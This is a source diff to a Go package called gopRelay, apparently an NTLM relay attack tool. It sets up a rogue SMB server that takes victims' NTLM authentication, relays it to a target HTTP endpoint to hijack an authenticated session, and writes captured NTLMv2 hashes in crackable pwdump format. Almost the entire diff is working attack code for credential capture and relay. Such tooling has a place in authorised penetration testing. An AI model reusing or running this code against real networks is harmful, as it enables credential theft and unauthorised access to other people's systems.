@@ -1,6 +1,7 @@
 package gopRelay
 
 import (
+	"bytes"
 	"crypto/tls"
 	"encoding/base64"
 	"encoding/binary"
@@ -20,7 +21,6 @@ import (
 )
 
 func RunSMBServer(serverAddr string, ProcessIncomingConnChan chan incomingConn) {
-	serverAddr = "192.168.71.1:4445"
 	serverAddrTCP4, err := net.ResolveTCPAddr("tcp", serverAddr)
 	if err != nil {
 		logger.Fatal(err)
@@ -40,7 +40,7 @@ func RunSMBServer(serverAddr string, ProcessIncomingConnChan chan incomingConn) 
 			logger.Println(err)
 			break
 		}
-		defer conn.Close()
+		// defer conn.Close()
 
 		ProcessIncomingConnChan <- incomingConn{
 			f:    HandleSMBServer,
@@ -131,12 +131,6 @@ func (n *NTLMAuthHTTPRelay) ProcessSMBServer(target string) error {
 
 				logger.Println(sessionComNegotiate.ToString())
 
-				// NETBIOS
-				netBIOSResponse := &NetBiosPacket{
-					MessageType: NETBIOS_SESSION_MESSAGE,
-					Length:      make([]byte, 3),
-				}
-
 				// SMB
 				// SMB2 Header
 				smbHeader := &SMB2_HEADER_SYNC{
@@ -151,31 +145,21 @@ func (n *NTLMAuthHTTPRelay) ProcessSMBServer(target string) error {
 					MessageID:     0x00000000,
 					Reserved:      0x00000000,
 					TreeID:        0x00000000,
-					SessionID:     0x0000000000000000,
-					Signature:     [16]byte{},
+					SessionID:     0x00,
+					Signature:     [16]byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
 				}
-				logger.Println(smbHeader.ToString())
 
 				// SMB2 Negotiate Protcol Response
 				sessionComNegotiateResponse := NewSMB2_NEGOTIATE_RESPONSE()
-				logger.Println(sessionComNegotiateResponse.ToString())
 
-				// Compute NetBIOS length
-				netBIOSResponse.SetLength(uint32(smbHeader.StructureSize + sessionComNegotiateResponse.GetLength()))
+				// Compute packet
+				resp, err := CreatePacket(smbHeader.ToBytes(), sessionComNegotiateResponse.ToBytes())
+				if err != nil {
+					logger.Fprintln(logger.Writer(), err)
+					return err
+				}
 
-				// respGood := []byte{0x0, 0x0, 0x0, 0xaa, 0xfe, 0x53, 0x4d, 0x42, 0x40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x3, 0x0, 0xff, 0x2, 0x0, 0x0, 0xd2, 0xbc, 0x1f, 0xa8, 0xda, 0x8d, 0x61, 0x43, 0x80, 0xd2, 0x4c, 0x85, 0x28, 0x24, 0xf5, 0x72, 0x7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x0, 0x0, 0x0, 0x80, 0x0, 0x0, 0x0, 0x80, 0x0, 0x8b, 0xe5, 0x9, 0x4c, 0x9, 0x82, 0xdb, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x0, 0x2a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x28, 0x6, 0x6, 0x2b, 0x6, 0x1, 0x5, 0x5, 0x2, 0xa0, 0x1e, 0x30, 0x1c, 0xa0, 0x1a, 0x30, 0x18, 0x6, 0xa, 0x2b, 0x6, 0x1, 0x4, 0x1, 0x82, 0x37, 0x2, 0x2, 0x1e, 0x6, 0xa, 0x2b, 0x6, 0x1, 0x4, 0x1, 0x82, 0x37, 0x2, 0x2, 0xa}
-
-				resp := append(netBIOSResponse.ToBytes(), smbHeader.ToBytes()...)
-				resp = append(resp, sessionComNegotiateResponse.ToBytes()...)
-
-				// logger.Printf("Len good : %d\nLen other : %d\n", len(respGood), len(resp))
-
-				// logger.Print("\tg\tb\n")
-				// for i := 0; i < min(len(respGood), len(resp)); i++ {
-				// 	logger.Printf("%d\t%x\t%x\n", i, respGood[i], resp[i])
-				// }
-				// logger.Print("\n\n")
-
+				// Send packet
 				_, err = n.clientConn.Write(resp)
 				if err != nil {
 					logger.Fprintln(logger.Writer(), err)
@@ -214,12 +198,6 @@ func (n *NTLMAuthHTTPRelay) ProcessSMBServer(target string) error {
 				// Write packet
 				//
 
-				// NETBIOS
-				netBIOSResponse := &NetBiosPacket{
-					MessageType: NETBIOS_SESSION_MESSAGE,
-					Length:      make([]byte, 3),
-				}
-
 				// SMB
 				// SMB2 Header
 				smbHeader := &SMB2_HEADER_SYNC{
@@ -234,28 +212,21 @@ func (n *NTLMAuthHTTPRelay) ProcessSMBServer(target string) error {
 					MessageID:     0x00000000,
 					Reserved:      0x00000000,
 					TreeID:        0x00000000,
-					SessionID:     0x0100000000340000,
-					Signature:     [16]byte{},
+					SessionID:     0x00,
+					Signature:     [16]byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
 				}
-				logger.Println(smbHeader.ToString())
 
 				// SMB2 Negotiate Protcol Response
 				sessionComNegotiateResponse := NewSMB2_NEGOTIATE_RESPONSE()
-				logger.Println(sessionComNegotiateResponse.ToString())
 
-				// Compute NetBIOS length
-				netBIOSResponse.SetLength(uint32(smbHeader.StructureSize + sessionComNegotiateResponse.GetLength()))
+				// Compute packet
+				resp, err := CreatePacket(smbHeader.ToBytes(), sessionComNegotiateResponse.ToBytes())
+				if err != nil {
+					logger.Fprintln(logger.Writer(), err)
+					return err
+				}
 
-				// TODO
-				resp := append(netBIOSResponse.ToBytes(), smbHeader.ToBytes()...)
-				resp = append(resp, sessionComNegotiateResponse.ToBytes()...)
-
-				respGood := []byte{0x0, 0x0, 0x1, 0x2c, 0xfe, 0x53, 0x4d, 0x42, 0x40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xfe, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x1, 0x0, 0x11, 0x3, 0x5, 0x0, 0xba, 0x40, 0xab, 0x11, 0x57, 0xe0, 0x4e, 0x47, 0xb0, 0xc8, 0x44, 0xaa, 0x75, 0x3a, 0x74, 0xa0, 0xaf, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x0, 0x0, 0x0, 0x80, 0x0, 0x0, 0x0, 0x80, 0x0, 0x57, 0x40, 0x7e, 0xff, 0xce, 0x82, 0xdb, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x0, 0x2a, 0x0, 0xb0, 0x0, 0x0, 0x0, 0x60, 0x28, 0x6, 0x6, 0x2b, 0x6, 0x1, 0x5, 0x5, 0x2, 0xa0, 0x1e, 0x30, 0x1c, 0xa0, 0x1a, 0x30, 0x18, 0x6, 0xa, 0x2b, 0x6, 0x1, 0x4, 0x1, 0x82, 0x37, 0x2, 0x2, 0x1e, 0x6, 0xa, 0x2b, 0x6, 0x1, 0x4, 0x1, 0x82, 0x37, 0x2, 0x2, 0xa, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x26, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x20, 0x0, 0x1, 0x0, 0x63, 0xb2, 0x67, 0xce, 0xa0, 0x7a, 0xdf, 0x89, 0x83, 0x2d, 0x8, 0x80, 0xa6, 0x4a, 0x53, 0xa, 0x88, 0x1b, 0xd4, 0x28, 0xd9, 0x1f, 0xed, 0x20, 0x23, 0x2d, 0xa5, 0x4d, 0x2f, 0xd0, 0x31, 0x88, 0x0, 0x0, 0x2, 0x0, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x0, 0x4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7, 0x0, 0xc, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3, 0x0, 0xc, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x4, 0x0}
-
-				_, compareStr := CompareBytesSlices(respGood, resp)
-				logger.Print(compareStr)
-
-				// TODO
+				// Send packet
 				_, err = n.clientConn.Write(resp)
 				if err != nil {
 					logger.Println(err)
@@ -276,166 +247,226 @@ func (n *NTLMAuthHTTPRelay) ProcessSMBServer(target string) error {
 					return err
 				}
 
-				logger.Println(sessionComSessionSetupRequest.ToString())
+				NTLMSSPMessage := append([]byte{0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x0}, bytes.Split(sessionComSessionSetupRequest.Buffer,
+					[]byte{0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x0})[1]...)
+				msgType := binary.LittleEndian.Uint32(NTLMSSPMessage[8:12])
 
+				switch msgType {
 				//
-				// Decode the NTLM SSP Negotiate packet
+				// NTLM NEGOTIATE
 				//
+				case 1:
 
-				ntlmNegotiateRequest_bytes := sessionComSessionSetupRequest.Buffer[34:]
-				serverNegotiateRequest := ntlm.NTLMSSP_NEGOTIATE{}
-				serverNegotiateRequest.Read(ntlmNegotiateRequest_bytes)
+					//
+					// Decode the NTLM SSP Negotiate packet
+					//
 
-				logger.Printf("%s | %s | client :: gop | [+] NTLM NEGOTIATE\n", n.ClientConnUUID, currentRelay.relayUUID)
-				for _, line := range strings.Split(serverNegotiateRequest.ToString(), "\n") {
-					logger.Printf("%s | %s | client :: gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
-				}
+					serverNegotiateRequest := ntlm.NTLMSSP_NEGOTIATE{}
+					serverNegotiateRequest.Read(NTLMSSPMessage)
 
-				/*
-				 *
-				 * Client part
-				 *
-				 */
-				clientChallBytes := []byte{}
+					logger.Printf("%s | %s | client :: gop | [+] NTLM NEGOTIATE\n", n.ClientConnUUID, currentRelay.relayUUID)
+					for _, line := range strings.Split(serverNegotiateRequest.ToString(), "\n") {
+						logger.Printf("%s | %s | client :: gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
+					}
 
-				clientNTLMSSPChallengeResponse, err := func(buf *[]byte) (*ntlm.NTLMSSP_CHALLENGE, error) {
+					/*
+					 *
+					 * Client part
+					 *
+					 */
+					authorization_bytes, err := func() ([]byte, error) {
 
-					clientInitialRequest, err := http.NewRequest(http.MethodGet, target, nil)
+						clientInitialRequest, err := http.NewRequest(http.MethodGet, target, nil)
+						if err != nil {
+							logger.Println(err)
+							return nil, err
+						}
+
+						clientInitialResponse, err := currentRelay.SendRequestGetResponse(clientInitialRequest, "gop", "target")
+						if err != nil {
+							logger.Println(err)
+							return nil, err
+						}
+
+						if _, exist := clientInitialResponse.Header["Www-Authenticate"]; !exist {
+							err := fmt.Errorf("no authorization header present on the client")
+							logger.Println(err)
+							return nil, err
+
+						}
+
+						clientNegotiateRequest := gopproxy.CopyRequest(clientInitialRequest)
+						clientNegotiateRequest.URL, err = url.Parse(currentRelay.target)
+						if err != nil {
+							logger.Println(err)
+							return nil, err
+						}
+						clientNegotiateRequest.Header.Add("Authorization", fmt.Sprintf("NTLM %s", base64.StdEncoding.EncodeToString(serverNegotiateRequest.ToBytes())))
+
+						clientNegotiateResponse, err := currentRelay.SendRequestGetResponse(clientNegotiateRequest, "gop", "target")
+						if err != nil {
+							logger.Println(err)
+							return nil, err
+						}
+
+						authorization := clientNegotiateResponse.Header.Get("Www-Authenticate")
+
+						if clientNegotiateResponse.StatusCode != 401 {
+							err := fmt.Errorf("client respond with a %s code", clientNegotiateResponse.Status)
+							logger.Printf("%s | %s | Error       : %s\n", n.ClientConnUUID, currentRelay.relayUUID, err)
+							currentRelay.conn.CloseIdleConnections()
+							return nil, err
+						}
+
+						authorization_bytes, err := base64.StdEncoding.DecodeString(authorization[5:])
+						if err != nil {
+							err := fmt.Errorf("clientNegotiateResponse : decode error authorization header : %s", authorization)
+							return nil, err
+						}
+
+						return authorization_bytes, nil
+
+					}()
+
 					if err != nil {
 						logger.Println(err)
-						return nil, err
+						return err
 					}
 
-					clientInitialResponse, err := currentRelay.SendRequestGetResponse(clientInitialRequest, "gop", "target")
-					if err != nil {
-						logger.Println(err)
-						return nil, err
-					}
-
-					if _, exist := clientInitialResponse.Header["Www-Authenticate"]; !exist {
-						err := fmt.Errorf("no authorization header present on the client")
-						logger.Println(err)
-						return nil, err
-
-					}
-
-					clientNegotiateRequest := gopproxy.CopyRequest(clientInitialRequest)
-					clientNegotiateRequest.URL, err = url.Parse(currentRelay.target)
-					if err != nil {
-						logger.Println(err)
-						return nil, err
-					}
-					clientNegotiateRequest.Header.Add("Authorization", fmt.Sprintf("NTLM %s", base64.StdEncoding.EncodeToString(ntlmNegotiateRequest_bytes)))
-
-					clientNegotiateResponse, err := currentRelay.SendRequestGetResponse(clientNegotiateRequest, "gop", "target")
-					if err != nil {
-						logger.Println(err)
-						return nil, err
-					}
-
-					authorization := clientNegotiateResponse.Header.Get("Www-Authenticate")
-
-					if clientNegotiateResponse.StatusCode != 401 {
-						err := fmt.Errorf("client respond with a %s code", clientNegotiateResponse.Status)
-						logger.Printf("%s | %s | Error       : %s\n", n.ClientConnUUID, currentRelay.relayUUID, err)
-						currentRelay.conn.CloseIdleConnections()
-						return nil, err
-					}
-
-					authorization_bytes, err := base64.StdEncoding.DecodeString(authorization[5:])
-					if err != nil {
-						err := fmt.Errorf("decode error authorization header : %s", authorization)
-						return nil, err
-					}
 					logger.Printf("\n\n[+]Authorization bytes:\n %x\n\n", authorization_bytes)
 
-					clientChallengeNTLM := ntlm.NTLMSSP_CHALLENGE{}
-					clientChallengeNTLM.Read(authorization_bytes)
+					/*
+					 *
+					 * End client part
+					 *
+					 */
+
+					clientNTLMSSPChallengeResponse := ntlm.NTLMSSP_CHALLENGE{}
+					clientNTLMSSPChallengeResponse.Read(authorization_bytes)
 
 					logger.Fprintf(logger.Writer(), "%s | %s | gop :: target | [+] Client Challenge\n", n.ClientConnUUID, currentRelay.relayUUID)
-					for _, line := range strings.Split(clientChallengeNTLM.ToString(), "\n") {
+					for _, line := range strings.Split(clientNTLMSSPChallengeResponse.ToString(), "\n") {
 						fmt.Printf("%s | %s | gop :: target | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
 					}
 
-					clientChallBytes, err = binary.Append(clientChallBytes, binary.LittleEndian, authorization_bytes)
-					if err != nil {
-						return nil, err
+					//
+					// Write packet
+					//
+
+					// SMB
+					// SMB2 Header
+					smbHeader := &SMB2_HEADER_SYNC{
+						ProtocolID:    []byte{0xFE, 'S', 'M', 'B'},
+						StructureSize: 64,
+						CreditCharge:  1,
+						NT_STATUS:     binary.LittleEndian.Uint32([]byte{0x16, 0x0, 0x0, 0xc0}), // STATUS_MORE_PROCESSING_REQUIRED
+						Command:       SMB2_COM_SESSION_SETUP,
+						Credits:       33,
+						Flags:         0x00000001, // This is a responnse, Priority
+						NextCommand:   0x00000000,
+						MessageID:     0x00000001,
+						Reserved:      0x0000feff,
+						TreeID:        0x00000000,
+						SessionID:     binary.LittleEndian.Uint64([]byte{0xaf, 0x39, 0x7d, 0xdd, 0x0, 0x0, 0x0, 0x0}),
+						// SessionID: 0x0,
+						Signature: [16]byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
 					}
 
-					return &clientChallengeNTLM, nil
+					// Get the security buffer :
+					logger.Print("\n[+] Client NTLMSSP Session Setup Response :\n")
+					// logger.Print(clientNTLMSSPChallengeResponse.ToString())
 
-				}(&clientChallBytes)
+					// Create a new security buffer
+					logger.Print("\n[+] Create a new buffer :\n")
+					// secBuff := clientNTLMSSPChallengeResponse
+					secBuff := ntlm.NewNTLMSSP_CHALLENGEShort()
+					secBuff.Challenge = clientNTLMSSPChallengeResponse.Challenge
+					// secBuff.Flags = serverNegotiateRequest.Flags ^ SMB2_FLAGS_SIGNED
+					logger.Print(secBuff.ToString())
 
-				if err != nil {
-					logger.Println(err)
-					return err
-				}
-				logger.Println(clientChallBytes)
-				/*
-				 *
-				 * End client part
-				 *
-				 */
+					// SMB2 Session Setup Response created with the client NTLMSSP Challenge response
+					sessionComSessionSetupResponse := NewSMB2_COM_SESSION_SETUP_RESPONSE(secBuff.ToBytes(), 1)
+
+					// Compute packet
+					resp, err := CreatePacket(smbHeader.ToBytes(), sessionComSessionSetupResponse.ToBytes())
+					if err != nil {
+						logger.Fprintln(logger.Writer(), err)
+						return err
+					}
+
+					// Send packet
+					_, err = n.clientConn.Write(resp)
+					if err != nil {
+						logger.Println(err)
+						return err
+					}
+
+					continue
 
 				//
-				// Write packet
+				// NTLM AUTH
 				//
+				case 3:
+					//
+					// Decode the NTLM SSP AUTH packet
+					//
 
-				// NETBIOS
-				netBIOSResponse := &NetBiosPacket{
-					MessageType: NETBIOS_SESSION_MESSAGE,
-					Length:      make([]byte, 3),
+					serverAuthRequest := ntlm.NTLMSSP_AUTH{}
+					serverAuthRequest.Read(NTLMSSPMessage)
+					logger.Printf("[NTLM-AUTH] [%s] [%s] [%s] ", serverAuthRequest.TargetName.Payload, serverAuthRequest.Username.Payload, serverAuthRequest.Workstation.Payload)
+					logger.Printf("[NTLM message type 3]\n%s", serverAuthRequest.ToString())
+
+					logger.Printf("%s | %s | client :: gop | [+] NTLM NEGOTIATE\n", n.ClientConnUUID, currentRelay.relayUUID)
+					for _, line := range strings.Split(serverAuthRequest.ToString(), "\n") {
+						logger.Printf("%s | %s | client :: gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
+					}
+
+					ntlmv2Response := ntlm.NTLMv2Response{}
+					ntlmv2Response.Read(serverAuthRequest.NTLMv2Response.Payload)
+					logger.Printf("%s", ntlmv2Response.ToString())
+
+					ntlmv2_pwdump := fmt.Sprintf("%s::%s:%x:%x:%x\n", string(serverAuthRequest.Username.Payload), string(serverAuthRequest.TargetName.Payload), []byte(ntlm.Challenge), ntlmv2Response.NTProofStr, serverAuthRequest.NTLMv2Response.Payload[len(ntlmv2Response.NTProofStr):])
+
+					authInformations := fmt.Sprintf("%s:%s", string(serverAuthRequest.TargetName.Payload), string(serverAuthRequest.Username.Payload))
+					if _, found := ntlm.NtlmCapturedAuth[authInformations]; !found {
+						ntlm.NtlmCapturedAuth[authInformations] = true
+						logger.Printf("[PWDUMP] %s", ntlmv2_pwdump)
+					} else {
+						logger.Printf("[+] User %s NTLMv2 challenge was already captured.\n", authInformations)
+					}
+
+					/*
+					 *
+					 * Client part
+					 *
+					 */
+					clientAuthRequest, _ := http.NewRequest("GET", target, nil)
+					clientAuthRequest.Header.Add("Authorization", fmt.Sprintf("NTLM %s", base64.StdEncoding.EncodeToString(NTLMSSPMessage)))
+					clientAuthResponse, err := currentRelay.SendRequestGetResponse(clientAuthRequest, "gop", "target")
+					if err != nil {
+						logger.Println(err)
+						continue
+						// return err
+					}
+
+					if clientAuthResponse.StatusCode == 401 {
+						return fmt.Errorf("could not authenticate to the endpoint")
+					}
+
+					currentRelay.AuthorizationHeader = clientAuthRequest.Header.Get("Authorization")
+
+					/*
+					 *
+					 * End client part
+					 *
+					 */
+
+					goto end
+
+				default:
+					logger.Printf("NTLM msg type \"%d\" is not implemented", msgType)
+					continue
 				}
-
-				// SMB
-				// SMB2 Header
-				smbHeader := &SMB2_HEADER_SYNC{
-					ProtocolID:    []byte{0xFE, 'S', 'M', 'B'},
-					StructureSize: 64,
-					CreditCharge:  1,
-					NT_STATUS:     binary.LittleEndian.Uint32([]byte{0x16, 0x0, 0x0, 0xc0}), // STATUS_MORE_PROCESSING_REQUIRED
-					Command:       SMB2_COM_SESSION_SETUP,
-					Credits:       1,
-					Flags:         0x00000011, // This is a responnse, Priority
-					NextCommand:   0x00000000,
-					MessageID:     0x00000001,
-					Reserved:      0x0000feff,
-					TreeID:        0x00000000,
-					SessionID:     0x0900000000300000,
-					Signature:     [16]byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-				}
-
-				// Create security buffer :
-				logger.Print("\n[+] Client NTLMSSP Session Setup Response :\n")
-				logger.Print(clientNTLMSSPChallengeResponse.ToString())
-
-				// SMB2 Session Setup Response created with the client NTLMSSP Challenge response
-				sessionComSessionSetupResponse := NewSMB2_COM_SESSION_SETUP_RESPONSE(clientNTLMSSPChallengeResponse.ToBytes(), smbHeader.StructureSize)
-				logger.Printf("%#v\n", sessionComSessionSetupResponse)
-				logger.Printf("%x\n", sessionComSessionSetupResponse.ToBytes())
-				logger.Println(sessionComSessionSetupResponse.ToString())
-
-				// Compute NetBIOS length
-				netBIOSResponse.SetLength(uint32(smbHeader.StructureSize + sessionComSessionSetupResponse.GetLength()))
-
-				logger.Println(netBIOSResponse.ToString())
-				logger.Println(smbHeader.ToString())
-				logger.Println(sessionComSessionSetupResponse.ToString())
-
-				// TODO
-				resp := []byte{}
-				resp = append(resp, netBIOSResponse.ToBytes()...)
-				resp = append(resp, smbHeader.ToBytes()...)
-				resp = append(resp, sessionComSessionSetupResponse.ToBytes()...)
-
-				logger.Printf("response\n\n\n%x\n", resp)
-				_, err = n.clientConn.Write(resp)
-				if err != nil {
-					logger.Println(err)
-					return err
-				}
-
-				continue
 
 			default:
 				logger.Printf("SMB2 header commande \"%s\" is not implemented", SMB2_COMMAND_NAMES[smbHeader.Command])
@@ -447,239 +478,9 @@ func (n *NTLMAuthHTTPRelay) ProcessSMBServer(target string) error {
 			return err
 		}
 
-		continue
-
-		break
-
-		// clientRequest, err := http.ReadRequest(n.Reader)
-		// if err != nil {
-		// 	logger.Fprintln(logger.Writer(), err)
-		// 	return err
-		// }
-
-		// clientRequestDump, err := httputil.DumpRequest(clientRequest, true)
-		// if err != nil {
-		// 	logger.Fprintln(logger.Writer(), err)
-		// 	return err
-		// }
-		// io.Copy(io.Discard, clientRequest.Body)
-		// clientRequest.Body.Close()
-
-		// for _, line := range strings.Split(string(clientRequestDump), "\n") {
-		// 	logger.Fprintf(logger.Writer(), "%s | client -> gop | %s\n", n.ClientConnUUID, line)
-		// }
-		// logger.Fprint(logger.Writer(), "\n")
-
-		// clientAuthorizationHeader := clientRequest.Header.Get("Authorization")
-
-		// // Send WWW-Authenticate: NTLM header if not present
-		// if clientAuthorizationHeader == "" {
-		// 	// TCP Connexion will be closed by the client and a new TCP connexion will be received
-		// 	n.step = "Authentication"
-		// 	err := n.initiateWWWAuthenticate()
-		// 	if err != nil {
-		// 		logger.Fprintln(logger.Writer(), err)
-		// 		return err
-		// 	}
-		// 	return nil
-		// }
-
-		// clientAuthorization := clientRequest.Header.Get("Authorization")
-
-		// authorization_bytes, err := base64.StdEncoding.DecodeString(clientAuthorization[5:])
-		// if err != nil {
-		// 	err := fmt.Errorf("decode error authorization header : %s", clientAuthorization)
-		// 	logger.Panicln(err)
-		// 	continue
-		// 	// return err
-		// }
-		// msgType := binary.LittleEndian.Uint32(authorization_bytes[8:12])
-
-		// logger.Fprintf(logger.Writer(), "%s | %s | [+] Message type : %d\n", n.ClientConnUUID, currentRelay.relayUUID, msgType)
-
-		// /*
-		//  * Message Type 1
-		//  */
-
-		// // Received Negociate message. Handle it and answer with a Challenge message
-
-		// if msgType == uint32(1) {
-		// 	// Client Negotiate
-		// 	serverNegociateRequest := ntlm.NTLMSSP_NEGOTIATE{}
-		// 	serverNegociateRequest.Read(authorization_bytes)
-
-		// 	logger.Fprintf(logger.Writer(), "%s | %s | client :: gop | [+] NTLM NEGOTIATE\n", n.ClientConnUUID, currentRelay.relayUUID)
-		// 	for _, line := range strings.Split(serverNegociateRequest.ToString(), "\n") {
-		// 		logger.Fprintf(logger.Writer(), "%s | %s | client :: gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
-		// 	}
-
-		// 	/*
-		// 	 *
-		// 	 * Client part
-		// 	 *
-		// 	 */
-
-		// 	clientNegotiateRequest := gopproxy.CopyRequest(clientRequest)
-		// 	clientNegotiateRequest.URL, err = url.Parse(currentRelay.target)
-		// 	if err != nil {
-		// 		logger.Println(err)
-		// 		return err
-		// 	}
-
-		// 	logger.Println(clientNegotiateRequest)
-		// 	logger.Printf("%#v\n", &clientNegotiateRequest)
-
-		// 	clientNegotiateResponse, err := currentRelay.SendRequestGetResponse(clientNegotiateRequest, "gop", "target")
-		// 	if err != nil {
-		// 		logger.Println(err)
-		// 		return err
-		// 	}
-
-		// 	authorization := clientNegotiateResponse.Header.Get("Www-Authenticate")
-
-		// 	if clientNegotiateResponse.StatusCode != 401 {
-		// 		err := fmt.Errorf("client respond with a %s code", clientNegotiateResponse.Status)
-		// 		logger.Fprintf(logger.Writer(), "%s | %s | Error       : %s\n", n.ClientConnUUID, currentRelay.relayUUID, err)
-		// 		currentRelay.conn.CloseIdleConnections()
-		// 		return err
-		// 	}
-
-		// 	authorization_bytes, err = base64.StdEncoding.DecodeString(authorization[5:])
-		// 	if err != nil {
-		// 		err := fmt.Errorf("decode error authorization header : %s", authorization)
-		// 		return err
-		// 	}
-
-		// 	clientChallengeNTLM := ntlm.NTLMSSP_CHALLENGE{}
-		// 	clientChallengeNTLM.Read(authorization_bytes)
-
-		// 	logger.Fprintf(logger.Writer(), "%s | %s | gop :: target | [+] Client Challenge\n", n.ClientConnUUID, currentRelay.relayUUID)
-		// 	for _, line := range strings.Split(clientChallengeNTLM.ToString(), "\n") {
-		// 		fmt.Fprintf(logger.Writer(), "%s | %s | gop :: target | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
-		// 	}
-
-		// 	/*
-		// 	 *
-		// 	 * End client part
-		// 	 *
-		// 	 */
-		// 	clientNegotiateResponseDump, err := httputil.DumpResponse(clientNegotiateResponse, true)
-		// 	if err != nil {
-		// 		logger.Println(err)
-		// 		continue
-		// 		// return err
-		// 	}
-
-		// 	n.clientConn.Write(clientNegotiateResponseDump)
-		// 	for _, line := range strings.Split(string(clientNegotiateResponseDump), "\n") {
-		// 		logger.Fprintf(logger.Writer(), "%s | %s | client <- gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
-		// 	}
-
-		// 	logger.Fprintf(logger.Writer(), "%s | %s | client :: gop | [+] Sent server challenge to client\n", n.ClientConnUUID, currentRelay.relayUUID)
-
-		// 	continue
-		// }
-
-		// /*
-		//  * End Message Type 1
-		//  */
-
-		// // Retrieve information into the Authentication message
-		// /*
-		//  * Message Type 3
-		//  */
-		// if msgType == uint32(3) {
-		// 	logger.Fprintf(logger.Writer(), "%s | %s | client :: gop | [+] Server received Authenticate\n", n.ClientConnUUID, currentRelay.relayUUID)
-
-		// 	serverAuthenticate := ntlm.NTLMSSP_AUTH{}
-		// 	serverAuthenticate.Read(authorization_bytes)
-
-		// 	currentRelay.Domain = string(serverAuthenticate.TargetName.Payload)
-		// 	currentRelay.Username = string(serverAuthenticate.Username.Payload)
-		// 	currentRelay.Workstation = string(serverAuthenticate.Workstation.Payload)
-
-		// 	logger.Fprintf(logger.Writer(), "%s | %s | client :: gop | [+] Server authenticate\n", n.ClientConnUUID, currentRelay.relayUUID)
-		// 	for _, line := range strings.Split(serverAuthenticate.ToString(), "\n") {
-		// 		logger.Fprintf(logger.Writer(), "%s | %s | client :: gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
-		// 	}
-
-		// 	// Prepare final response to the client
-		// 	ntlmv2Response := ntlm.NTLMv2Response{}
-		// 	ntlmv2Response.Read(serverAuthenticate.NTLMv2Response.Payload)
-
-		// 	fmt.Fprintf(logger.Writer(), "%s | %s | client :: gop | [+] NTLM AUTHENTICATE RESPONSE:\n", n.ClientConnUUID, currentRelay.relayUUID)
-		// 	for _, line := range strings.Split(string(ntlmv2Response.ToString()), "\n") {
-		// 		fmt.Fprintf(logger.Writer(), "%s | %s | client :: gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
-		// 	}
-
-		// 	/*
-		// 	 *
-		// 	 * Client part
-		// 	 *
-		// 	 */
-		// 	clientAuthRequest, _ := http.NewRequest("GET", target, nil)
-		// 	gopproxy.CopyHeader(clientAuthRequest.Header, clientRequest.Header)
-		// 	clientAuthResponse, err := currentRelay.SendRequestGetResponse(clientAuthRequest, "gop", "target")
-		// 	if err != nil {
-		// 		logger.Println(err)
-		// 		continue
-		// 		// return err
-		// 	}
-
-		// 	if clientAuthResponse.StatusCode == 401 {
-		// 		return fmt.Errorf("could not authenticate to the endpoint")
-		// 	}
-
-		// 	currentRelay.AuthorizationHeader = clientRequest.Header.Get("Authorization")
-
-		// 	/*
-		// 	 *
-		// 	 * End client part
-		// 	 *
-		// 	 */
-
-		// 	randomPath := uuid.NewString()
